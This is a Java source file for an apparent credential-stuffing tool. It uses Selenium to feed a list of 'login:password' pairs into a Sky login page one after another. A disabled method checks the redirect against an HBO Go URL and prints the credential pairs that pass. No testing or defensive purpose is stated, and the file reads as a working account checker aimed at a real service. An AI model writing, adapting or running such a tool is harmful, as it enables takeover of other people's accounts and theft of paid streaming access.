package br.com.matheuslima.skytest.jobs;

import org.openqa.selenium.By;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

import br.com.matheuslima.skytest.utils.ConstantesTestSky;

import java.util.List;

public class JobProcessamentoTestSky {
	
	public static ChromeDriver driver;
	public List<String> linhas;
	
	public JobProcessamentoTestSky(List<String> linhas) {
		this.linhas = linhas;
	}

	public void run() throws InterruptedException {
		System.setProperty("webdriver.chrome.driver", "C:/chromedriver.exe");
		driver = new ChromeDriver();
		driver.get(ConstantesTestSky.URL_SKY_LOGIN);
		
		for (int i = 0; i < linhas.size(); i++) {
			String[] linhaFatiada = linhas.get(i).split(":");
			preencheCampos(linhaFatiada[0], linhaFatiada[1]);
		}
		
	}
	
	public void preencheCampos(String login, String senha) throws InterruptedException {
		
		try {
			WebElement loginElemento = driver.findElement(By.id("login"));
			loginElemento.sendKeys(login);

			WebElement senhaElemento = driver.findElement(By.id("senha"));
			senhaElemento.sendKeys(senha);
			
			WebElement btnLogin = driver.findElement(By.xpath("/html/body/div[1]/div/div[3]/form/div[2]/section/button"));
			btnLogin.click();
			
			Thread.sleep(2500);
		}catch(IllegalArgumentException e) {
			System.out.println(login + "|" + senha);
		}

//		validaLogin(login, senha);
	}
	
	public void validaLogin(String login, String senha) {
		
		if (!driver.getCurrentUrl().toString().equals("https://br.hbogola.com/services/responsehandler.aspx?redirect=3")) {
			driver.navigate().to(ConstantesTestSky.URL_SKY_LOGIN);
			driver.findElement(By.id("login")).clear();
			
			System.out.println(login + "|" + senha);

		} else {
			driver.navigate().to(ConstantesTestSky.URL_SKY_LOGIN);
			driver.findElement(By.id("login")).clear();

		}
	}
}
